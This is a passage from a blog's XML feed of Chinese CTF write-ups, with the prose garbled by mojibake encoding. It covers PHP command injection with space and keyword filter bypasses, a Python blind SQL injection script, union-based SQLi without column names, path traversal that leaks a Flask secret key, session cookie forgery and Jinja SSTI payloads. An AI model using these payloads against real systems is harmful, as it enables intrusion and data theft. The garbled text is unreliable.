class="hljs-string">&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;</span>);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å»éæ´²å§&quot;</span>);&#125;<span class="hljs-comment">//get flag</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;get_flag&#x27;</span>]))&#123;    $get_flag = $_GET[<span class="hljs-string">&#x27;get_flag&#x27;</span>];    <span class="hljs-keyword">if</span>(!strstr($get_flag,<span class="hljs-string">&quot; &quot;</span>))&#123;        $get_flag = str_ireplace(<span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;wctf2020&quot;</span>, $get_flag);        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;</span>;        system($get_flag);    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¿«åˆ°éæ´²äº†&quot;</span>);    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å»éæ´²å§&quot;</span>);&#125;<span class="hljs-meta">?&gt;</span>å»éæ´²å§</code></pre></code></pre><p>ç¬¬ä¸€ä¸ªï¼š<br>intvalå‡½æ•°â€”â€”â€“&gt;è·å–å˜é‡çš„æ•´æ•°å€¼      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">42</span>);                      <span class="hljs-comment">// 42</span><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">4.2</span>);                     <span class="hljs-comment">// 4</span><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;42&#x27;</span>);                    <span class="hljs-comment">// 42</span><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;+42&#x27;</span>);                   <span class="hljs-comment">// 42</span><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;-42&#x27;</span>);                   <span class="hljs-comment">// -42</span><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">042</span>);                     <span class="hljs-comment">// 34</span><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;042&#x27;</span>);                   <span class="hljs-comment">// 42</span><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">1e10</span>);                    <span class="hljs-comment">// 1410065408</span><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;1e10&#x27;</span>);                  <span class="hljs-comment">// 1</span><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">0x1A</span>);                    <span class="hljs-comment">// 26</span><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">42000000</span>);                <span class="hljs-comment">// 42000000</span><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">420000000000000000000</span>);   <span class="hljs-comment">// 0</span><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;420000000000000000000&#x27;</span>); <span class="hljs-comment">// 2147483647</span><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">42</span>, <span class="hljs-number">8</span>);                   <span class="hljs-comment">// 42</span><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;42&#x27;</span>, <span class="hljs-number">8</span>);                 <span class="hljs-comment">// 34</span><span class="hljs-keyword">echo</span> intval(<span class="hljs-keyword">array</span>());                 <span class="hljs-comment">// 0</span><span class="hljs-keyword">echo</span> intval(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;foo&#x27;</span>, <span class="hljs-string">&#x27;bar&#x27;</span>));     <span class="hljs-comment">// 1</span><span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>å­—ç¬¦ä¸²<code>&#39;1e11&#39;</code>â€”-1<br>æ•°å­—<code>1e10</code>â€”â€”&gt;1410065408<br>åˆ©ç”¨è¿™ä¸ªç»•è¿‡<br><code>num=2019e11</code><br>ç¬¬äºŒä¸ªï¼š<br>MD5ï¼š<code>$a==md5($a)</code>â€”â€”â€”&gt;<code>0e215962017</code><br>ç¬¬ä¸‰ä¸ªï¼š<br>å‘½ä»¤æ‰§è¡Œ<br>ls<br><code>404.html fAke_f1agggg.php fl4g.php fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag img.jpg index.php robots.txt </code><br>ç©ºæ ¼è¢«è¿‡ï¼Œç”¨<code>$IFS$9</code>ç»•è¿‡,phpç¯å¢ƒä¸‹<code>%09</code>ä¹Ÿå¯ç»•è¿‡ç©ºæ ¼<br>catå˜æˆca\tå¯ç»•è¿‡ï¼Œä¹Ÿå¯ç›´æ¥tac        </p><h2 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h2><p>payloadï¼š<code>?num=2019e11&amp;md5=0e215962017&amp;get_flag=ca\t%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code>        </p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p><code>$IFS</code>ä¹Ÿå¯ä»¥ç»•è¿‡ç©ºæ ¼ï¼Œä½†æ˜¯<code>ls$IFS/</code>èƒ½æ‰§è¡Œï¼Œè€Œ<code>tac$IFSflag</code>å´ä¸èƒ½æ‰§è¡ŒæˆåŠŸï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ        </p><p><code>$&#123;IFS&#125;,$IFS,$IFS$9çš„åŒºåˆ«</code><br>å•çº¯çš„<code>cat$IFS2</code>,bashè§£é‡Šå™¨ä¼šæŠŠæ•´ä¸ª<code>IFS2</code>å½“åšå˜é‡åï¼Œæ‰€ä»¥å¯¼è‡´è¾“ä¸å‡ºæ¥ç»“æœï¼Œç„¶è€Œå¦‚æœåŠ ä¸€ä¸ª<code>&#123;&#125;</code>å°±å›ºå®šäº†å˜é‡åï¼ŒåŒç†åœ¨åé¢åŠ ä¸ª<code>$</code>å¯ä»¥èµ·åˆ°æˆªæ–­çš„ä½œç”¨ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆè¦ç”¨<code>$9</code>å‘¢ï¼Œå› ä¸º<code>$9</code>åªæ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå®ƒå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ã€‚      </p><p>å¯¹äº <code>&gt;,+</code> ç­‰ ç¬¦å·çš„è¿‡æ»¤ , <code>$PS2</code>å˜é‡ä¸º<code>&gt;</code>,<code>$PS4</code>å˜é‡åˆ™ä¸º<code>+</code>            </p><p><a href="https://www.freebuf.com/articles/web/137923.html">MORE</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜</title>
    <link href="/2021/03/09/BUU048/"/>
    <url>/2021/03/09/BUU048/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[BJDCTF 2nd]ç®€å•æ³¨å…¥<br><img src="https://ftp.bmp.ovh/imgs/2021/03/44e4763d0293348f.png">       </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>åˆè¿‡æ»¤äº†å¥½å¤š<br><code>&#39;ã€&quot;ã€selectã€-ã€=ã€likeã€and</code><br>çœ‹WPè¯´æœ‰æç¤ºâ€”-&gt;<code>robots.txt</code><br>ä¸€èˆ¬é‡åˆ°çœ‹ä¸æ‡‚çš„é¢˜æˆ‘æ‰ä¼šè¯•ä¸€ä¸‹å¸¸è§çš„ç›®å½•ï¼Œæ²¡æƒ³åˆ°â€¦â€¦.<br><img src="https://ftp.bmp.ovh/imgs/2021/03/9c3fc6bade9ff396.png"><br>è¿™å’Œhgameé‚£é“ä¸€æ ·<br><code>\</code>è½¬ä¹‰         </p><h2 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h2><pre><code>```pythonimport requestsimport timeimport datetimeurl=&quot;http://3e7c563a-f050-412d-a249-054ffcd8ecff.node3.buuoj.cn/index.php&quot;flag=&quot;&quot;st=&quot;stronger&quot;for i in range(1,20):    s=30    l=127    mid=(s+l)&gt;&gt;1    while(l&gt;s):        time.sleep(0.1)        #payload=&quot;or if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(i,mid)        #payload=&quot;or if(ascii(substr(username,&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(i,mid)        payload=&quot;or if(ascii(substr(password,&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(i,mid)        data=&#123;&quot;username&quot;:&quot;test\\&quot;,&quot;password&quot;:payload&#125;        #time1=datetime.datetime.now()        r=requests.post(url=url,data=data)        #time2=datetime.datetime.now()        #tem=(time2-time1).seconds        if st in r.text:            s=mid+1        else:            l=mid        mid=(s+l)&gt;&gt;1    if s==30 or l==127:        break    flag=flag+chr(mid)    print(flag)      ```          </code></pre><p>æ—¶é—´ç›²æ³¨ä¹Ÿèƒ½è·‘å‡ºæ¥ï¼Œå°±æ˜¯æœ‰ç‚¹å„¿æ…¢<br>oråé¢0æˆ–è€…1çš„å›æ˜¾ä¸åŒ<br>0â€”â€”&gt;<code>You konw ,P3rh4ps needs a girl friend</code><br>1â€”â€”&gt;<code>BJD needs to be stronger</code><br>â€”&gt;boolç›²æ³¨</p><p>è¿™é¢˜çš„æŠ¥è¡¨ç›´æ¥å¯¹åˆ—æ¥æ“ä½œï¼Œå› ä¸ºåœ¨ä¸Šé¢çš„SQLè¯­å¥ä¸­æœ‰<code>FROM users</code>ï¼Œè€Œä¸”=å’Œlikeéƒ½è¢«è¿‡äº†ï¼Œåªèƒ½è¿™æ ·äº†å§<br><img src="https://ftp.bmp.ovh/imgs/2021/03/17cfe81b59870b7a.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜</title>
    <link href="/2021/03/08/BUU047/"/>
    <url>/2021/03/08/BUU047/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[SWPU2019]Web1     </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>æ³¨å†Œç™»å½•å<br><img src="https://ftp.bmp.ovh/imgs/2021/03/911adb6d6d040a6b.png"><br>è€ƒè™‘XSS<br>ä½†è¯•äº†è¯•ï¼Œæ„Ÿè§‰ä¸è¡Œ<br>çœ‹çœ‹WP<br>æ˜¯å¡«å†™å¹¿å‘Šåé‚£é‡Œå­˜åœ¨SQLæ³¨å…¥<br>æœ‰è¿‡æ»¤<br><code>#ã€orã€--ã€informationã€ç©ºæ ¼....</code>åŒå†™ä¹Ÿç»•ä¸è¿‡<br>æŠ¥é”™ä¿¡æ¯<code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39; limit 0,1&#39; at line 1</code><br>æ•°æ®åº“â€”â€“&gt;MariaDB<br>æ³¨é‡Šè¢«è¿‡ï¼Œå¯ä»¥æœ€ååŠ ä¸ª<code>&#39;</code>é—­åˆä¸‹åé¢çš„<code>&#39;</code><br>ç©ºæ ¼è¢«è¿‡ç”¨<code>/**/</code><br>orderæ²¡æ³•ç”¨ï¼Œå¯ä»¥æ¢æˆgroup<br><code>1&#39;/**/group/**/by/**/50,&#39;</code>äºŒåˆ†æ³•æŸ¥çœ‹æœ‰å¤šå°‘ä¸ªå­—æ®µâ€”-&gt;22ä¸ª<br>MariaDBä¸­çš„<code>mysql.innodb_table_stats</code>å¯ä»¥æŸ¥åˆ°æ‰€æœ‰çš„è¡¨ï¼Œç±»ä¼¼äº<code>information_schema.tables</code>å§<br>ç„¶åæ˜¯      </p><p><code>æ— åˆ—åæ³¨å…¥</code>         </p><p><img src="https://ftp.bmp.ovh/imgs/2021/03/06a0943a7b2b0112.png"><br>åˆ—åå˜æˆäº†1ï¼Œ2ï¼Œ3<br><img src="https://ftp.bmp.ovh/imgs/2021/03/c4be37e1bc11bae4.png"><br>ç”¨åå¼•å·æŸ¥è¯¢ç‰¹å®šçš„åˆ—<br>åå¼•å·ä¹Ÿå¯ä»¥ç”¨asæ›¿æ¢<br><img src="https://ftp.bmp.ovh/imgs/2021/03/67a55ac030f9ddd6.png"><br>æ‹¬å·é‡Œè¡¨çš„å­—æ®µæ•°ä¹Ÿè¦fuzzä¸€ä¸‹<br><code>1&#39;/**/union/**/select/**/1,2,(select/**/1,2/**/union/**/select*from/**/users),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;2</code>â€”â€”â€”â€”â€“&gt;æŠ¥é”™<code>The used SELECT statements have a different number of columns</code></p><h2 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h2><p>æŸ¥è¡¨payloadï¼š<code>1&#39;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code><br>è¡¨ï¼š<code>FLAG_TABLE,news,users,gtid_slave_pos,ads,users</code><br>æ— åˆ—åæŸ¥è¯¢ï¼š<code>1&#39;/**/union/**/select/**/1,2,(select/**/group_concat(d)/**/from(select/**/1,2,3/**/as/**/d/**/union/**/select*from/**/users)ad),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;2</code><br>å¾—åˆ°flag       </p><p>è¿™ä¸ªæ— åˆ—åæ³¨å…¥æœ€åçš„æ‹¬å·å‰é¢éœ€è¦æœ‰éšä¾¿çš„å­—æ¯<br>ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Ÿï¼Ÿ      </p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p><a href="https://www.cnblogs.com/wangtanzhi/p/12241499.html">MORE</a><br><a href="https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/">[SQLi] Extracting data without knowing columns names</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Henuctf</title>
    <link href="/2021/03/07/henuctf/"/>
    <url>/2021/03/07/henuctf/</url>
    
    <content type="html"><![CDATA[<h2 id="Find"><a href="#Find" class="headerlink" title="Find"></a>Find</h2><pre><code>```php &lt;?phperror_reporting(0);include &#39;flag.php&#39;;highlight_file(__FILE__);if(!(is_file($_GET[&#39;name&#39;])===false))&#123;    echo $flag;    &#125;else&#123;    die(&quot;å‘ç”Ÿç”šä¹ˆäº‹äº†ï¼Ÿ&quot;);    &#125;?&gt; å‘ç”Ÿç”šä¹ˆäº‹äº†ï¼Ÿ```    </code></pre><p><code>is_file</code> â€” åˆ¤æ–­ç»™å®šæ–‡ä»¶åæ˜¯å¦ä¸ºä¸€ä¸ªæ­£å¸¸çš„æ–‡ä»¶<br>å¦‚æœæ–‡ä»¶å­˜åœ¨ä¸”ä¸ºæ­£å¸¸çš„æ–‡ä»¶åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSEã€‚<br>ä¸Šé¢æœ‰ä¸ª<code>flag.php</code>,é‚£ç›´æ¥<code>name=flag.php</code>å³å¯      </p><p>ä½†æ˜¯ï¼Œå­¦é•¿è¯´è¿™é“é¢˜å‡ºé”™äº†ï¼Œä¸åº”è¯¥<code>include &#39;flag.php&#39;;</code><br>é¢„æœŸçš„è§£æ˜¯ç”¨æ•°ç»„ç»•è¿‡<code>is_file</code>å‡½æ•°<br><code>name[]=1</code>      </p><h2 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h2><p>hintï¼šå½“å‰è¿›ç¨‹ä¸‹çš„ç¯å¢ƒå˜é‡ä¸º<code>/proc/self/environ</code><br>çŸ¥è¯†ç‚¹ï¼šflask sessionä¼ªé€ <br>ä»»æ„æ–‡ä»¶è¯»å–ï¼Œ<img src="https://ftp.bmp.ovh/imgs/2021/03/1934b3e1e8d9fb33.png"><br>è¯»å–hintä¸­çš„æ–‡ä»¶ï¼Œä¸è¿‡è¦å…ˆè¿›è¡Œç›®å½•è·³è·ƒ</p><p><code>download?image=/../../proc/self/environ</code><br>é‡Œé¢æœ‰<code>SECRET_KEY=SK7BM6DwM52ByfSmNJfP1QYe4MdXnMUW3ibrL8AtHOSTNAME</code>å¯†é’¥<br>ç„¶åç”¨<code>flask-session-cookie-manager</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/5f53b08a21a8d4fe.png"><br>æäº¤å³å¯<br><code>flask-session-cookie-manager</code>åŸºæœ¬ç”¨æ³•ï¼š<br>ç¼–ç ï¼š  </p><pre><code>$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py encode -s &#39;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#39; -t &#39;&#123;&quot;number&quot;:&quot;326410031505&quot;,&quot;username&quot;:&quot;admin&quot;&#125;&#39;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw       </code></pre><p>è§£ç ï¼š<br>ä½¿ç”¨å¯†é’¥ï¼š      </p><pre><code>$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py decode -c &#39;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#39; -s &#39;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#39;&#123;u&#39;username&#39;: &#39;admin&#39;, u&#39;number&#39;: &#39;326410031505&#39;&#125;        </code></pre><p>æ²¡æœ‰å¯†é’¥ï¼š       </p><pre><code>$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py decode -c &#39;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#39;&#123;&quot;number&quot;:&#123;&quot; b&quot;:&quot;MzI2NDEwMDMxNTA1&quot;&#125;,&quot;username&quot;:&#123;&quot; b&quot;:&quot;YWRtaW4=&quot;&#125;&#125;          </code></pre><p><a href="https://github.com/noraj/flask-session-cookie-manager">MORE</a></p><h2 id="Mai"><a href="#Mai" class="headerlink" title="Mai"></a>Mai</h2><p><code>__toString</code>é­”æ³•å‡½æ•°çš„è§¦å‘ï¼š         </p><ol><li>æŠŠå¯¹è±¡å½“å­—ç¬¦ä¸²è¾“å‡º       </li><li>æŠŠå¯¹è±¡å½“ä½œå­—ç¬¦ä¸²æ¯”è¾ƒä¹Ÿå¯è§¦å‘<h2 id="love"><a href="#love" class="headerlink" title="love"></a>love</h2></li></ol><p>è¿™é“SQLæ³¨å…¥ï¼ŒæŠŠasciiå’Œsubstrç¦äº†ï¼Œç„¶åå°±ä¸çŸ¥é“è¯¥å’‹å¼„äº†ï¼Œç™¾åº¦å½“æ—¶ä¹Ÿæ²¡æŸ¥åˆ°         </p><pre><code>asciiå¯ä»¥ç”¨ordæ›¿æ¢        substrå¯ä»¥ç”¨mid,leftåº”è¯¥ä¹Ÿå¯ä»¥        </code></pre><p><a href="https://blog.csdn.net/qq_19272431/article/details/78564391">å¼‚æˆ–</a></p><pre><code>1 ^ 1 = 00 ^ 0 = 01 ^ 0 = 10 ^ 1 = 11^1^1=11^0^1=0</code></pre><p>å¤ªç¬¨äº†å¤ªç¬¨äº†</p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥æ‰“å¡</title>
    <link href="/2021/03/06/BUU046/"/>
    <url>/2021/03/06/BUU046/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[WesternCTF2018]shrine        </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>æºç ï¼š    </p><pre><code>```pythonimport flaskimport osapp = flask.Flask(__name__)app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)          ##flagåœ¨configé‡Œ@app.route(&#39;/&#39;)def index():    return open(__file__).read()@app.route(&#39;/shrine/&#39;)def shrine(shrine):    def safe_jinja(s):        s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)        blacklist = [&#39;config&#39;, &#39;self&#39;]        return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s    return flask.render_template_string(safe_jinja(shrine))if __name__ == &#39;__main__&#39;:    app.run(debug=True)     ```   </code></pre><p>ä¸¤ä¸ªè·¯ç”±ï¼Œç¬¬äºŒä¸ªå­˜åœ¨SSTI<img src="https://ftp.bmp.ovh/imgs/2021/03/45aacf69b12a54b2.png"><br>flagåœ¨configé‡Œï¼Œä½†configå’Œselfè¢«ç¦äº†<br>å¦‚æœæ²¡è¢«ç¦çš„è¯å°±å¯ä»¥ç›´æ¥<code>&#123;&#123;config&#125;&#125;</code>æˆ–è€…<code>&#123;&#123;self.dict&#125;&#125;</code><br>å¯ä»¥ç”¨<code>url_for</code>å’Œ<code>get_flashed_message</code>       </p><h2 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h2><p>payload1ï¼š<code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code>        </p><p><code>url_for</code>ç”¨äºç»™æŒ‡å®šçš„å‡½æ•°åˆ›å»ºurlï¼ŒåŠ ä¸Š<code>__globals</code>å¯ä»¥è®¿é—®æ‰€æœ‰çš„è·¯ç”±ï¼Œç„¶åè¯»å–å½“å‰APPçš„config<br>payload2ï¼š<code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;</code><br><code>get_flashed_messages</code>è¿”å›ä¹‹å‰åœ¨Flaskä¸­é€šè¿‡ flash() ä¼ å…¥çš„é—ªç°ä¿¡æ¯åˆ—è¡¨ã€‚æŠŠå­—ç¬¦ä¸²å¯¹è±¡è¡¨ç¤ºçš„æ¶ˆæ¯åŠ å…¥åˆ°ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œç„¶åé€šè¿‡è°ƒç”¨ <code>get_flashed_messages()</code> æ–¹æ³•å–å‡º,é—ªç°ä¿¡æ¯åªèƒ½å–å‡ºä¸€æ¬¡ï¼Œå–å‡ºåé—ªç°ä¿¡æ¯ä¼šè¢«æ¸…ç©º.        </p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p><a href="https://flask.palletsprojects.com/en/1.0.x/api/#flask.get_flashed_messages"><code>get_flashed_message</code></a><br><a href="https://flask.palletsprojects.com/en/1.0.x/api/?highlight=url_for#flask.url_for"><code>url_for</code></a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥æ‰“å¡</title>
    <link href="/2021/03/05/BUU045/"/>
    <url>/2021/03/05/BUU045/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p><code>[å®‰æ´µæ¯ 2019]easy_serialize_php</code>        </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>é¢˜ç›®ç»™å‡ºæºç           </p><pre><code><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>$function = @$_GET[<span class="hljs-string">&#x27;f&#x27;</span>];<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params">$img</span>)</span>&#123;       <span class="hljs-comment">##è¿‡æ»¤</span>    $filter_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);    $filter = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,$filter_arr).<span class="hljs-string">&#x27;/i&#x27;</span>;    <span class="hljs-keyword">return</span> preg_replace($filter,<span class="hljs-string">&#x27;&#x27;</span>,$img);&#125;<span class="hljs-keyword">if</span>($_SESSION)&#123;    <span class="hljs-keyword">unset</span>($_SESSION);&#125;$_SESSION[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;           <span class="hljs-comment">##sessionåˆå§‹å€¼</span>$_SESSION[<span class="hljs-string">&#x27;function&#x27;</span>] = $function;extract($_POST);          <span class="hljs-keyword">if</span>(!$function)&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;&#125;<span class="hljs-keyword">if</span>(!$_GET[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;    $_SESSION[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);&#125;<span class="hljs-keyword">else</span>&#123;    $_SESSION[<span class="hljs-string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="hljs-string">&#x27;img_path&#x27;</span>]));&#125;$serialize_info = filter(serialize($_SESSION));<span class="hljs-keyword">if</span>($function == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;    highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($function == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($function == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;    $userinfo = unserialize($serialize_info);    <span class="hljs-keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="hljs-string">&#x27;img&#x27;</span>]));&#125;</code></pre></code></pre><p>ç¬¬ä¸€ä¸ªç‚¹ï¼š<code>extract($_POST)</code><br>extract â€” ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨<br><img src="https://ftp.bmp.ovh/imgs/2021/03/881d9fbac954102b.png"><br>é€šè¿‡è¿™ä¸ªå¯ä»¥è¾¾åˆ°è¦†ç›–<code>$_SESSION</code>çš„ç›®çš„<br>å¦‚ï¼š<br>åœ¨è¿™å¥è¯çš„ä¸‹é¢åŠ ä¸Š<code>var_dump($_SESSION);</code><br>åŸæ¥çš„è¾“å‡º:<code>array(2) &#123; [&quot;user&quot;]=&gt; string(5) &quot;guest&quot; [&quot;function&quot;]=&gt; NULL &#125;</code><br>POSTä¼ å…¥<code>_SESSION[flag]=123</code>åçš„è¾“å‡ºæ˜¯ï¼š<code>array(1) &#123; [&quot;flag&quot;]=&gt; string(3) &quot;123&quot; &#125;</code><br>ç¬¬äºŒä¸ªç‚¹ï¼šåœ¨<code>phpinfo</code>ä¸­æ‰¾åˆ°æ–‡ä»¶<code>d0g3_f1ag.php</code><br>ç¬¬ä¸‰ä¸ªç‚¹ï¼š<code>file_get_contents</code>ä»¥æ­¤è¯»å–æ–‡ä»¶ï¼Œ<code>$_SESSION[img]=d0g3_f1ag.php</code><br>ç¬¬å››ä¸ªç‚¹ï¼šå…ˆåºåˆ—åŒ–åè¿‡æ»¤<br>ä¹‹å‰åšè¿‡ä¸€é“<code>[0CTF 